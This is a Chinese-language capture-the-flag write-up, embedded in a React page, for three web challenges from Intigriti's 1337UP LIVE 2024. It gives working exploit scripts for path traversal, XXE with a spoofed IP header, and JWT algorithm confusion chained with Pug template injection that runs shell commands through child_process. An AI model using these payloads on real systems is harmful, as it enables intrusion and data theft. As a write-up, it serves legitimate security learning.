import X from 'src/component/X';
import metas from 'src/app/_metas';

const path = '/24d/wp-1337uplive-2024/';
export const {metadata} = metas[path];

export default function Post() {
    return (
        <>
            <X.TOC />
            <X.Title>{metas[path].title}</X.Title>
            <X.H1>Web</X.H1>
            <X.H2>Pizza Paradise</X.H2>
            <X.P>在`robots.txt`中找到登录页面`/secret_172346606e1d24062e891d537e917a90.html`，在JS中找到用户名和密码的哈希值；队友找到一个查弱口令的网站@[https://crackstation.net]@，查到密码是`intel420`，登录。</X.P>
            <X.Image src="fig1.jpg" width="100%" />
            <X.P>登录后是下载图片的页面，有路径遍历漏洞。`flag`在页面的PHP源码中。</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                # login with agent_1337, intel420

                path = "/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"
                url = f"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download={path}"
                resp = requests.get(url)
                print(resp.text)

                # $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
                `}
            />
            <X.H2>BioCrop</X.H2>
            <X.P>给了源码，需要绕过对IP的检测（服务端用了自定义的HTTP头），然后是XXE（XML外部实体注入）。</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "https://biocorp.ctf.intigriti.io/panel.php"
                xml = """
                <!DOCTYPE root [
                <!ENTITY fileContents SYSTEM "file:///../flag.txt">
                ]>
                <root>
                <temperature>&fileContents;</temperature>
                <pressure>77</pressure>
                <control_rods>77</control_rods>
                </root>
                """
                resp = requests.post(url, headers={"X-BIOCORP-VPN": "80.187.61.102", "Content-Type": "application/xml"}, data=xml)
                print(resp.text)

                # Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} °C
                `}
            />
            <X.H2>Cat Club</X.H2>
            <X.P>JWT算法混淆+Pug模板引擎的SSTI。</X.P>
            <X.P>注册登录后`/cats`页面会显示用户的用户名，审计后发现存在SSTI：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                if (typeof req.user != "undefined") {
                    template = template.replace(/guest/g, req.user);
                }
                `}
            />
            <X.P>但是常规手段注册不允许出现非数字和字母的字符，考虑直接构造用户名为`payload`的JWT`token`。</X.P>
            <X.P>`/jwks.json`接口泄露了`publicKey`，并且服务端检验JWT的函数是：</X.P>
            <X.CodeBlock
                language="js"
                code={`
                function signJWT(payload) {
                    return new Promise((resolve, reject) => {
                        jwt.encode(privateKey, payload, "RS256", (err, token) => {
                            if (err) {
                                return reject(new Error("Error encoding token"));
                            }
                            resolve(token);
                        });
                    });
                }

                function verifyJWT(token) {
                    return new Promise((resolve, reject) => {
                        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
                            return reject(new Error("Invalid token format"));
                        }

                        jwt.decode(publicKey, token, (err, payload, header) => {
                            if (err) {
                                return reject(new Error("Invalid or expired token"));
                            }

                            if (header.alg.toLowerCase() === "none") {
                                return reject(new Error("Algorithm 'none' is not allowed"));
                            }

                            resolve(payload);
                        });
                    });
                }
                `}
            />
            <X.P>RSA的私钥无法拿到，但上述校验存在算法混淆漏洞，可以自己用`publicKey`和HS256算法做一个签名，此时服务端校验的逻辑仍然是使用`publicKey`验证，而算法已经被指定为HS256，于是可以通过。生成`token`的代码是：</X.P>
            <X.CodeBlock
                language="js"
                highlightLines="17"
                code={`
                const fs = require("fs");
                const jwt = require("json-web-token");
                const jwkToPem = require('jwk-to-pem');

                // const publicKey = fs.readFileSync("public_key.pem", "utf8");

                const publicKey = jwkToPem({
                    "kty": "RSA",
                    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
                    "e": "AQAB",
                    "alg": "RS256",
                    "use": "sig"
                });

                function signJWT(payload) {
                    return new Promise((resolve, reject) => {
                        jwt.encode(publicKey, payload, "HS256", (err, token) => {
                            if (err) {
                                return reject(new Error("Error encoding token"));
                            }
                            resolve(token);
                        });
                    });
                }

                signJWT({
                    // username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"
                    username: "#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}"
                }).then(token => {
                    console.log(token);
                    fs.writeFileSync("token.txt", token);
                });
                `}
            />
            <X.P>攻击：</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = f"https://catclub-2.ctf.intigriti.io/cats"

                with open("catclub_exp/token.txt") as f:
                    token = f.read().strip()
                resp = requests.get(url, cookies={"token": token})

                # print(resp.text)
                print(resp.text.split('alt="Club Logo"></nav></header><div class="content"><h1>')[1])

                # Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!</h1> ...
                `}
            />
        </>
    );
}
